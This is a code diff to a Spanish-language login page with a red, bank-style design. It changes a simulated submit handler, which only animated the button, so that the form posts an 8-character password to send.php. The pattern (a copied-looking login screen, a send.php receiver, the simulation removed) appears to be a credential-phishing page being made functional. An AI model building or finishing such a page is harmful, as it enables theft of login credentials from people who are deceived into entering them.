@@ -155,7 +155,7 @@ ob_end_clean();
                 <span class="text-red-600 cursor-pointer">No es mi cuenta</span>
                 <span class="text-red-600 cursor-pointer">Olvidé mi contraseña</span>
             </div>
-            <button id="btnSubmit" type="submit" class="w-full bg-red-600 text-white font-bold py-4 rounded-lg shadow-lg">Ingresar</button>
+            <button id="btnSubmit" type="submit" class="w-full bg-red-600 text-white font-bold py-4 rounded-lg shadow-lg opacity-50 cursor-not-allowed">Ingresar</button>
         </div>
         </form>
     </div>
@@ -229,28 +229,22 @@ passField.addEventListener('input', (e) => {
 });
 
 /**
- * PASO 2: Manejo del envío (solo interfaz y animaciones)
+ * PASO 2: Validación antes de envío
  */
-btnSubmit.addEventListener('click', async () => {
+btnSubmit.addEventListener('click', (e) => {
     const password = passField.value.trim();
     
-    // Validación antes de procesar
-    if (password.length !== 8) return;
+    // Validación: solo permitir si tiene exactamente 8 caracteres
+    if (password.length !== 8) {
+        e.preventDefault();
+        return;
+    }
 
-    // Animación visual del botón
+    // Si pasa la validación, mostrar estado de carga
     btnSubmit.innerText = "Verificando...";
     btnSubmit.disabled = true;
-
-    // Simulación de procesamiento (2 segundos)
-    setTimeout(() => {
-        btnSubmit.innerText = "Completado";
-        btnSubmit.classList.add('bg-green-600');
-        btnSubmit.classList.remove('bg-red-600');
-        
-        // Aquí puedes agregar tu lógica personalizada
-        // Por ejemplo: redirigir a otra página, mostrar mensaje, etc.
-        console.log("Formulario enviado correctamente");
-    }, 2000);
+    
+    // El formulario se enviará normalmente a send.php
 });
     </script>
 </body>
